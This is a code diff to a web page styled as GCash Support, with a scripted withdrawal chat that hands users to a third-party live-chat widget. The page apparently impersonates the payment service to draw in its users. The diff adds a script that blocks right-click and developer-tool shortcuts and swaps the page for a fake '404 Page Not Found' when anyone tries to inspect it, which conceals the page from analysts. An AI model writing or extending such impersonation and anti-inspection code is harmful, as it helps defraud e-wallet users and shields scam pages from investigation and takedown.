@@ -80,8 +80,8 @@
   <div class="container">
     <div class="chat-box">
       <div class="message support">Hi! Welcome to GCash Support. How can we help you today?</div>
-      <div class="message user">How can I withdraw my money?.</div>
-      <div class="message support">No worries! We'll help you with your Withdrawal. Please describe your issue below.</div>
+      <div class="message user">How can I withdraw my money?</div>
+      <div class="message support">No worries! We'll help you with your withdrawal. Please describe your issue below.</div>
     </div>
 
     <form onsubmit="openChaport(); return false;">
@@ -116,5 +116,27 @@
   </script>
   <!-- End of Chaport Live Chat code -->
 
+  <!-- Block Inspection and Show Fake 404 -->
+  <script>
+    document.addEventListener('contextmenu', event => event.preventDefault());
+
+    document.onkeydown = function(e) {
+      if (
+        e.keyCode === 123 || // F12
+        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
+        (e.ctrlKey && e.keyCode === 85) // Ctrl+U
+      ) {
+        fakeErrorPage();
+        return false;
+      }
+    };
+
+    function fakeErrorPage() {
+      document.body.innerHTML = "<h1 style='text-align:center; margin-top:50px;'>404 Page Not Found</h1>";
+      document.body.style.backgroundColor = "white";
+      document.title = "404 Not Found";
+    }
+  </script>
+
 </body>
-</html>
+    </html>
